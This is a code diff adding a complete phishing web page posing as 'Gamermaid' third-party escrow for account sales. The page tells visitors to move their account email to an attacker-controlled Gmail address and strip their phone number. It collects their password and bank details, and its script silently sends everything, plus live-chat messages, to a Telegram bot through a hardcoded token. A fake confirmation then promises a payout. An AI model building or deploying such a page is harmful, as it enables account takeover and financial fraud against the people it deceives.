@@ -1,0 +1,909 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Third Party Escrow Services | Gamermaid</title>
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --bg-main: #ffffff;
+            --bg-secondary: #f8fafc;
+            --text-primary: #0f172a;
+            --text-muted: #64748b;
+            --text-light: #94a3b8;
+            --danger-red: #ef4444;
+            --danger-bg: rgba(239, 68, 68, 0.06);
+            --danger-border: rgba(239, 68, 68, 0.2);
+            
+            --gradient-primary: linear-gradient(135deg, #3b82f6 0%, #8b5cf6 50%, #ec4899 100%);
+            --gradient-subtle: linear-gradient(135deg, rgba(59, 130, 246, 0.05) 0%, rgba(139, 92, 246, 0.05) 50%, rgba(236, 72, 153, 0.05) 100%);
+            
+            --glass-bg-light: rgba(255, 255, 255, 0.85);
+            --glass-bg-dark: rgba(15, 23, 42, 0.85);
+            --glass-border-light: rgba(226, 232, 240, 0.8);
+            --glass-border-dark: rgba(255, 255, 255, 0.12);
+            --glass-blur: blur(16px);
+            
+            --shadow-sm: 0 2px 8px rgba(15, 23, 42, 0.04);
+            --shadow-md: 0 12px 32px rgba(15, 23, 42, 0.08);
+            --shadow-dark: 0 20px 40px rgba(0, 0, 0, 0.35);
+            --radius-sm: 8px;
+            --radius-md: 12px;
+            --radius-lg: 20px;
+            --radius-full: 9999px;
+
+            --transition-fast: 0.15s cubic-bezier(0.4, 0, 0.2, 1);
+            --transition-normal: 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        *, *::before, *::after {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
+            background-color: var(--bg-main);
+            color: var(--text-primary);
+            line-height: 1.6;
+            overflow-x: hidden;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        a { color: inherit; text-decoration: none; }
+        button { font-family: inherit; cursor: pointer; border: none; outline: none; background: none; }
+
+        .icon {
+            width: 18px;
+            height: 18px;
+            stroke-width: 2;
+            stroke: currentColor;
+            fill: none;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+            flex-shrink: 0;
+        }
+
+        .container {
+            max-width: 1240px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
+
+        .glow-ambient {
+            position: absolute;
+            width: 600px;
+            height: 600px;
+            background: radial-gradient(circle, rgba(139, 92, 246, 0.15) 0%, rgba(59, 130, 246, 0.1) 40%, rgba(236, 72, 153, 0) 70%);
+            top: -200px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: -1;
+            pointer-events: none;
+        }
+
+        /* Header */
+        .header {
+            position: sticky;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+            background: var(--glass-bg-light);
+            backdrop-filter: var(--glass-blur);
+            -webkit-backdrop-filter: var(--glass-blur);
+            border-bottom: 1px solid var(--glass-border-light);
+        }
+
+        .navbar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            height: 76px;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 700;
+            font-size: 1.25rem;
+        }
+
+        .logo-icon {
+            width: 34px;
+            height: 34px;
+            background: var(--gradient-primary);
+            border-radius: var(--radius-sm);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+        }
+
+        .logo-text {
+            background: var(--gradient-primary);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .nav-desktop {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            list-style: none;
+        }
+
+        .nav-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 8px 14px;
+            font-size: 0.925rem;
+            font-weight: 500;
+            color: var(--text-muted);
+            border-radius: var(--radius-sm);
+            transition: all var(--transition-fast);
+        }
+
+        .nav-link:hover {
+            color: var(--text-primary);
+            background: rgba(15, 23, 42, 0.04);
+        }
+
+        .nav-actions {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .btn-signin {
+            padding: 9px 20px;
+            border-radius: var(--radius-full);
+            background: var(--text-primary);
+            color: #ffffff;
+            font-size: 0.875rem;
+            font-weight: 600;
+        }
+
+        /* Escrow Content */
+        .escrow-section {
+            padding: 60px 0 100px 0;
+        }
+
+        .escrow-header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .page-title {
+            font-size: 2.5rem;
+            font-weight: 700;
+            letter-spacing: -0.02em;
+            margin-bottom: 16px;
+        }
+
+        .payout-card {
+            background: var(--danger-bg);
+            border: 1.5px solid var(--danger-border);
+            border-radius: var(--radius-lg);
+            padding: 24px 32px;
+            max-width: 680px;
+            margin: 0 auto 48px auto;
+            text-align: center;
+            box-shadow: 0 4px 20px rgba(239, 68, 68, 0.08);
+        }
+
+        .payout-row {
+            font-size: 1.05rem;
+            font-weight: 600;
+            color: var(--danger-red);
+            margin: 8px 0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 4px 0;
+        }
+
+        .payout-row.total {
+            font-size: 1.35rem;
+            font-weight: 700;
+            border-top: 1px dashed rgba(239, 68, 68, 0.3);
+            padding-top: 14px;
+            margin-top: 12px;
+        }
+
+        .form-card {
+            background: #ffffff;
+            border: 1px solid var(--glass-border-light);
+            border-radius: var(--radius-lg);
+            padding: 40px;
+            max-width: 680px;
+            margin: 0 auto;
+            box-shadow: var(--shadow-md);
+        }
+
+        .form-section-title {
+            font-size: 1.35rem;
+            font-weight: 700;
+            margin-bottom: 24px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid var(--glass-border-light);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .form-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            margin-bottom: 36px;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+
+        .form-group.full-width {
+            grid-column: span 2;
+        }
+
+        .form-group label {
+            font-size: 0.875rem;
+            font-weight: 600;
+            color: var(--text-primary);
+        }
+
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 12px 16px;
+            border-radius: var(--radius-md);
+            border: 1px solid var(--glass-border-light);
+            background: var(--bg-secondary);
+            font-family: inherit;
+            font-size: 0.95rem;
+            color: var(--text-primary);
+            outline: none;
+        }
+
+        .form-group input:focus, .form-group select:focus {
+            border-color: #8b5cf6;
+            background: #ffffff;
+            box-shadow: 0 0 0 4px rgba(139, 92, 246, 0.15);
+        }
+
+        .field-notice {
+            font-size: 0.825rem;
+            color: var(--danger-red);
+            font-weight: 500;
+            margin-top: 4px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .email-change-banner {
+            background: rgba(59, 130, 246, 0.08);
+            border: 1px solid rgba(59, 130, 246, 0.25);
+            color: #2563eb;
+            padding: 12px 16px;
+            border-radius: var(--radius-md);
+            font-weight: 600;
+            font-size: 0.9rem;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .bank-logos-container {
+            margin-bottom: 24px;
+        }
+
+        .bank-logos-title {
+            font-size: 0.85rem;
+            font-weight: 600;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            margin-bottom: 12px;
+        }
+
+        .bank-badges {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+
+        .bank-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            padding: 8px 16px;
+            background: var(--bg-secondary);
+            border: 1px solid var(--glass-border-light);
+            border-radius: var(--radius-md);
+            font-size: 0.875rem;
+            font-weight: 600;
+            color: var(--text-primary);
+        }
+
+        .bank-icon-svg {
+            width: 24px;
+            height: 24px;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 0.75rem;
+            color: #ffffff;
+        }
+
+        .bg-kbz { background: #0056b3; }
+        .bg-thai { background: #d97706; }
+        .bg-hk { background: #dc2626; }
+
+        .btn-continue {
+            width: 100%;
+            padding: 16px;
+            border-radius: var(--radius-full);
+            background: var(--gradient-primary);
+            color: #ffffff;
+            font-weight: 600;
+            font-size: 1.05rem;
+            box-shadow: 0 10px 25px rgba(139, 92, 246, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        /* Rules Section Styling */
+        .rules-container {
+            max-width: 680px;
+            margin: 40px auto 0 auto;
+            background: var(--bg-secondary);
+            border: 1px solid var(--glass-border-light);
+            border-radius: var(--radius-lg);
+            padding: 30px;
+        }
+
+        .rules-title {
+            font-size: 1.15rem;
+            font-weight: 700;
+            margin-bottom: 14px;
+            color: var(--text-primary);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .rules-list {
+            list-style-type: disc;
+            padding-left: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            color: var(--text-muted);
+            font-size: 0.9rem;
+        }
+
+        /* Modal */
+        .modal-backdrop {
+            position: fixed;
+            inset: 0;
+            background: rgba(15, 23, 42, 0.6);
+            backdrop-filter: blur(8px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+            opacity: 0;
+            visibility: hidden;
+            transition: all var(--transition-normal);
+            z-index: 2000;
+        }
+
+        .modal-backdrop.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .modal-card {
+            background: #ffffff;
+            border-radius: var(--radius-lg);
+            padding: 40px;
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+            box-shadow: var(--shadow-dark);
+        }
+
+        .modal-status-icon {
+            width: 64px;
+            height: 64px;
+            border-radius: var(--radius-full);
+            background: rgba(59, 130, 246, 0.1);
+            color: #3b82f6;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px auto;
+        }
+
+        .modal-title {
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin-bottom: 12px;
+        }
+
+        .modal-desc {
+            color: var(--text-muted);
+            font-size: 0.975rem;
+            margin-bottom: 24px;
+            line-height: 1.6;
+        }
+
+        .modal-contact {
+            padding: 12px 16px;
+            background: var(--bg-secondary);
+            border-radius: var(--radius-md);
+            font-weight: 600;
+            color: #8b5cf6;
+            margin-bottom: 24px;
+            font-size: 0.9rem;
+        }
+
+        /* Live Chat Widget Styling */
+        .chat-widget-btn {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            width: 56px;
+            height: 56px;
+            background: var(--gradient-primary);
+            color: #ffffff;
+            border-radius: var(--radius-full);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 10px 25px rgba(139, 92, 246, 0.4);
+            cursor: pointer;
+            z-index: 1500;
+            transition: transform var(--transition-fast);
+        }
+
+        .chat-widget-btn:hover {
+            transform: scale(1.05);
+        }
+
+        .chat-box-container {
+            position: fixed;
+            bottom: 96px;
+            right: 24px;
+            width: 340px;
+            max-width: calc(100vw - 48px);
+            background: #ffffff;
+            border: 1px solid var(--glass-border-light);
+            border-radius: var(--radius-lg);
+            box-shadow: var(--shadow-dark);
+            display: none;
+            flex-direction: column;
+            overflow: hidden;
+            z-index: 1500;
+        }
+
+        .chat-box-container.active {
+            display: flex;
+        }
+
+        .chat-header {
+            background: var(--gradient-primary);
+            color: #ffffff;
+            padding: 16px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .chat-messages {
+            height: 280px;
+            padding: 16px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            background: var(--bg-secondary);
+        }
+
+        .chat-msg {
+            max-width: 80%;
+            padding: 10px 14px;
+            border-radius: var(--radius-md);
+            font-size: 0.875rem;
+        }
+
+        .chat-msg.incoming {
+            background: #ffffff;
+            color: var(--text-primary);
+            align-self: flex-start;
+            border: 1px solid var(--glass-border-light);
+        }
+
+        .chat-msg.outgoing {
+            background: #8b5cf6;
+            color: #ffffff;
+            align-self: flex-end;
+        }
+
+        .chat-input-area {
+            display: flex;
+            padding: 12px;
+            background: #ffffff;
+            border-top: 1px solid var(--glass-border-light);
+            gap: 8px;
+        }
+
+        .chat-input-area input {
+            flex: 1;
+            padding: 8px 12px;
+            border: 1px solid var(--glass-border-light);
+            border-radius: var(--radius-sm);
+            outline: none;
+            font-family: inherit;
+            font-size: 0.875rem;
+        }
+
+        .chat-send-btn {
+            background: #8b5cf6;
+            color: #ffffff;
+            padding: 8px 14px;
+            border-radius: var(--radius-sm);
+            font-weight: 600;
+            font-size: 0.875rem;
+        }
+
+        @media (max-width: 600px) {
+            .form-grid { grid-template-columns: 1fr; }
+            .form-group.full-width { grid-column: span 1; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="glow-ambient"></div>
+
+    <!-- Header -->
+    <header class="header">
+        <div class="container">
+            <nav class="navbar">
+                <a href="index.html" class="logo">
+                    <div class="logo-icon">
+                        <svg class="icon" viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
+                    </div>
+                    <span class="logo-text">gamermaid</span>
+                </a>
+                <div class="nav-desktop">
+                    <a href="index.html" class="nav-link">Home</a>
+                    <a href="escrow.html" class="nav-link" style="color:var(--text-primary); font-weight:600;">Escrow Services</a>
+                </div>
+                <div class="nav-actions">
+                    <a href="#" class="btn-signin">Sign In</a>
+                </div>
+            </nav>
+        </div>
+    </header>
+
+    <!-- Escrow Main Content -->
+    <main class="escrow-section">
+        <div class="container">
+            
+            <div class="escrow-header">
+                <h1 class="page-title">Third Party Escrow Services</h1>
+                <p style="color: var(--text-muted);">Secure automated verification and middleman clearance system.</p>
+            </div>
+
+            <!-- Red Payout Summary Highlight -->
+            <div class="payout-card">
+                <div class="payout-row">
+                    <span>KingAccMarket Deposit</span>
+                    <span>20,000,00 Kyats</span>
+                </div>
+                <div class="payout-row">
+                    <span>Middle Man Fee (7%)</span>
+                    <span>- 1,400,00 Kyats</span>
+                </div>
+                <div class="payout-row total">
+                    <span>You will get</span>
+                    <span>18,600,00 Kyats</span>
+                </div>
+            </div>
+
+            <!-- Form -->
+            <div class="form-card">
+                <form id="escrowForm">
+                    <div class="form-section-title">
+                        <svg class="icon" viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+                        <span>Account Verification</span>
+                    </div>
+
+                    <!-- Email Change Instruction Notice -->
+                    <div class="email-change-banner">
+                        Change your Email to gamermaid.ai@gmail.com
+                    </div>
+
+                    <div class="form-grid">
+                        <div class="form-group">
+                            <label for="username">Username</label>
+                            <input type="text" id="username" name="username" placeholder="Enter account username" required>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="password">Password</label>
+                            <input type="password" id="password" name="password" placeholder="Enter account password" required>
+                        </div>
+
+                        <div class="form-group full-width">
+                            <div class="field-notice">
+                                <svg class="icon" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+                                <span>Required: Remove your Phone Number on your TikTok Account before submitting for verification.</span>
+                            </div>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="signinLocation">Sign in Location</label>
+                            <input type="text" id="signinLocation" name="signinLocation" placeholder="City / Region / Country" required>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="signupDate">Sign up Date</label>
+                            <input type="date" id="signupDate" name="signupDate" required>
+                        </div>
+
+                        <div class="form-group full-width">
+                            <label for="phoneModel">What Phone Model do you use to sign up?</label>
+                            <input type="text" id="phoneModel" name="phoneModel" placeholder="e.g. iPhone 14 Pro / Samsung Galaxy S23" required>
+                        </div>
+                    </div>
+
+                    <div class="form-section-title">
+                        <svg class="icon" viewBox="0 0 24 24"><rect x="2" y="5" width="20" height="14" rx="2"/><line x1="2" y1="10" x2="22" y2="10"/></svg>
+                        <span>Bank Information</span>
+                    </div>
+
+                    <div class="bank-logos-container">
+                        <div class="bank-logos-title">Supported Banking Partners</div>
+                        <div class="bank-badges">
+                            <div class="bank-badge">
+                                <div class="bank-icon-svg bg-kbz">KBZ</div>
+                                <span>KBZ Bank</span>
+                            </div>
+                            <div class="bank-badge">
+                                <div class="bank-icon-svg bg-thai">TH</div>
+                                <span>Thai Bank</span>
+                            </div>
+                            <div class="bank-badge">
+                                <div class="bank-icon-svg bg-hk">HK</div>
+                                <span>Hong Kong Bank</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="form-grid">
+                        <div class="form-group">
+                            <label for="bankName">Bank Name</label>
+                            <select id="bankName" name="bankName" required>
+                                <option value="">Select your bank</option>
+                                <option value="KBZ Bank">KBZ Bank</option>
+                                <option value="Thai Bank">Thai Bank</option>
+                                <option value="Hong Kong Bank">Hong Kong Bank</option>
+                                <option value="Other">Other International Bank</option>
+                            </select>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="accountHolder">Account Holder Name</label>
+                            <input type="text" id="accountHolder" name="accountHolder" placeholder="Full name as on bank account" required>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="accountNumber">Account Number</label>
+                            <input type="text" id="accountNumber" name="accountNumber" placeholder="Bank account number / IBAN" required>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="swiftCode">SWIFT Code</label>
+                            <input type="text" id="swiftCode" name="swiftCode" placeholder="SWIFT / BIC code" required>
+                        </div>
+                    </div>
+
+                    <button type="submit" class="btn-continue">
+                        <span>Continue</span>
+                        <svg class="icon" viewBox="0 0 24 24"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
+                    </button>
+                </form>
+            </div>
+
+            <!-- Rules Section Added at the Bottom -->
+            <div class="rules-container">
+                <div class="rules-title">
+                    <svg class="icon" viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
+                    <span>Escrow Terms & Rules</span>
+                </div>
+                <ul class="rules-list">
+                    <li>All account credentials provided must be accurate and fully accessible by our admin team during verification.</li>
+                    <li>Sellers must ensure phone numbers are completely unlinked from the account prior to submission.</li>
+                    <li>Payouts are processed strictly within 24 hours after successful verification and transfer completion.</li>
+                    <li>Any fraudulent submissions, incorrect bank info, or attempts to reclaim accounts will result in immediate cancellation of the escrow transaction.</li>
+                    <li>For support inquiries, contact our team directly at ai@gamermaid.site.</li>
+                </ul>
+            </div>
+
+        </div>
+    </main>
+
+    <!-- Live Chat Widget -->
+    <button class="chat-widget-btn" id="chatToggleBtn" aria-label="Open Chat">
+        <svg class="icon" viewBox="0 0 24 24" style="width:24px;height:24px;"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+    </button>
+
+    <div class="chat-box-container" id="chatBox">
+        <div class="chat-header">
+            <span>Chat with Admin</span>
+            <button id="chatCloseBtn" style="color:white; font-weight:700; cursor:pointer;">&times;</button>
+        </div>
+        <div class="chat-messages" id="chatMessages">
+            <div class="chat-msg incoming">Hello! Welcome to Gamermaid Escrow. How can we help you today?</div>
+        </div>
+        <div class="chat-input-area">
+            <input type="text" id="chatInput" placeholder="Type a message...">
+            <button class="chat-send-btn" id="chatSendBtn">Send</button>
+        </div>
+    </div>
+
+    <!-- Modal Status Confirmation -->
+    <div class="modal-backdrop" id="confirmationModal">
+        <div class="modal-card">
+            <div class="modal-status-icon">
+                <svg class="icon" style="width:32px;height:32px;" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+            </div>
+            <h3 class="modal-title">Verification In Progress</h3>
+            <p class="modal-desc">
+                The admins are checking your account. We will send Your Money to your Bank Accounts after 24 hours.<br>
+                <strong style="color: var(--text-primary); display:block; margin-top:8px;">(Make sure You fill the Bank info Correctly).</strong>
+            </p>
+            <div class="modal-contact">
+                Need Help? Contact ai@gamermaid.site
+            </div>
+            <button class="btn-signin" style="width:100%; cursor:pointer;" id="closeModalBtn">Close Window</button>
+        </div>
+    </div>
+
+    <!-- Scripts (Telegram + Chat Widget) -->
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const escrowForm = document.getElementById('escrowForm');
+            const confirmationModal = document.getElementById('confirmationModal');
+            const closeModalBtn = document.getElementById('closeModalBtn');
+
+            // Configured Telegram Bot Credentials
+            const TELEGRAM_BOT_TOKEN = '9110476686:AAEWur5sDsKFeD6SFLcXMnleLfw57_F-5RY';
+            const CHAT_ID = '9110476686';
+
+            // Escrow Form Submission handler
+            escrowForm.addEventListener('submit', async (e) => {
+                e.preventDefault();
+                
+                const formData = new FormData(escrowForm);
+                const data = Object.fromEntries(formData.entries());
+
+                const message = `
+🔔 NEW ESCROW SUBMISSION:
+
+👤 ACCOUNT INFO:
+- Email Changed To: gamermaid.ai@gmail.com
+- Username: ${data.username}
+- Password: ${data.password}
+- Sign-in Location: ${data.signinLocation}
+- Sign-up Date: ${data.signupDate}
+- Phone Model: ${data.phoneModel}
+
+🏦 BANK INFORMATION:
+- Bank Name: ${data.bankName}
+- Account Holder: ${data.accountHolder}
+- Account Number: ${data.accountNumber}
+- SWIFT Code: ${data.swiftCode}
+                `.trim();
+
+                try {
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: message
+                        })
+                    });
+                } catch (err) {
+                    console.error('Failed to send Telegram notification:', err);
+                }
+
+                confirmationModal.classList.add('active');
+            });
+
+            closeModalBtn.addEventListener('click', () => {
+                confirmationModal.classList.remove('active');
+                escrowForm.reset();
+            });
+
+            // Live Chat Widget Interactions & Telegram Integration
+            const chatToggleBtn = document.getElementById('chatToggleBtn');
+            const chatBox = document.getElementById('chatBox');
+            const chatCloseBtn = document.getElementById('chatCloseBtn');
+            const chatSendBtn = document.getElementById('chatSendBtn');
+            const chatInput = document.getElementById('chatInput');
+            const chatMessages = document.getElementById('chatMessages');
+
+            chatToggleBtn.addEventListener('click', () => {
+                chatBox.classList.toggle('active');
+            });
+
+            chatCloseBtn.addEventListener('click', () => {
+                chatBox.classList.remove('active');
+            });
+
+            chatSendBtn.addEventListener('click', sendMessage);
+            chatInput.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') sendMessage();
+            });
+
+            async function sendMessage() {
+                const text = chatInput.value.trim();
+                if (!text) return;
+
+                // 1. Display user message in website chat UI
+                const userMsg = document.createElement('div');
+                userMsg.className = 'chat-msg outgoing';
+                userMsg.textContent = text;
+                chatMessages.appendChild(userMsg);
+                chatInput.value = '';
+                chatMessages.scrollTop = chatMessages.scrollHeight;
+
+                // 2. Forward chat message to Admin on Telegram
+                const telegramChatMessage = `💬 NEW LIVE CHAT MESSAGE:\n"${text}"`;
+
+                try {
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: telegramChatMessage
+                        })
+                    });
+                } catch (err) {
+                    console.error('Failed to send chat message to Telegram:', err);
+                }
+
+                // 3. Automated acknowledgement response
+                setTimeout(() => {
+                    const replyMsg = document.createElement('div');
+                    replyMsg.className = 'chat-msg incoming';
+                    replyMsg.textContent = 'An admin has received your message and will review it shortly.';
+                    chatMessages.appendChild(replyMsg);
+                    chatMessages.scrollTop = chatMessages.scrollHeight;
+                }, 1000);
+            }
+        });
+    </script>
+</body>
+</html>
